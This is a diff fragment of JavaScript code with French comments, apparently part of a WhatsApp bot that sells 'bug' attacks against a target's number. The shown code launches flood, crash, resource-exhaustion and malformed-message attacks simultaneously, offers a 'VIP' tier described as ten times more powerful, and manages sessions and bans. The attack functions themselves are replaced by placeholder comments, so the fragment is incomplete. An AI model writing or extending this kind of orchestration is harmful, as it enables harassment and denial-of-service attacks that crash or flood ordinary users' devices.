+    // Déterminer l'intensité en fonction du type
+    const intensity = type === "vip" ? 10 : 1;
+    
+    // Lancer plusieurs vecteurs d'attaque
+    const attackId = {
+        flood: startFloodAttack(conn, target, durationMinutes, intensity),
+        crash: startCrashAttack(conn, target, durationMinutes, intensity),
+        resource: startResourceAttack(conn, target, durationMinutes, intensity),
+        malformed: startMalformedAttack(conn, target, durationMinutes, intensity)
+    };
+    
+    activeBugs.set(target, {
+        type: type,
+        id: attackId,
+        startTime: Date.now(),
+        duration: durationMinutes
+    });
+    
+    // Arrêt automatique après la durée spécifiée
+    setTimeout(() => {
+        if (activeBugs.has(target)) {
+            stopWhatsAppBug(target);
+        }
+    }, durationMinutes * 60 * 1000);
+}
+
+// [Les fonctions de bugs restent identiques au code précédent...]
+// ... (toutes les fonctions de bugs précédentes restent inchangées)
+
+// ==============================================
+// FONCTIONS DE BUGS VIP (10x PLUS PUISSANTES)
+// ==============================================
+
+// [Les fonctions VIP restent identiques au code précédent...]
+// ... (toutes les fonctions VIP précédentes restent inchangées)
+
+// Nettoyage des sessions expirées
+setInterval(() => {
+    const now = Date.now();
+    vipSessions.forEach((expiry, sender) => {
+        if (now > expiry) {
+            vipSessions.delete(sender);
+        }
+    });
+}, 60 * 1000); // Vérifier toutes les minutes
+
+// Nettoyage automatique des bannissements expirés
+setInterval(() => {
+    try {
+        const bans = readJSONFile(BANS_FILE);
+        const now = Date.now();
+        
+        // Filtrer les bannissements expirés
+        const activeBans = bans.filter(ban => ban.expiryDate > now);
+        
+        if (bans.length !== activeBans.length) {
+            writeJSONFile(BANS_FILE, activeBans);
+            console.log(`Nettoyage automatique: ${bans.length - activeBans.length} bannissement(s) expiré(s) supprimés`);
+        }
+    } catch (e) {
+        console.error("Erreur lors du nettoyage automatique des bannissements:", e);
+    }
+}, 24 * 60 * 60 * 1000); // Nettoyer toutes les 24 heures
+
+// Nettoyage à la fermeture
+process.on('exit', () => {
+    activeBugs.forEach((bug, target) => {
+        stopVipBug(target);
+    });
+});
+
+// Gestionnaire pour les erreurs non attrapées
+process.on('uncaughtException', (error) => {
+    console.error('Erreur non attrapée:', error);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Rejet non géré:', reason);
+});
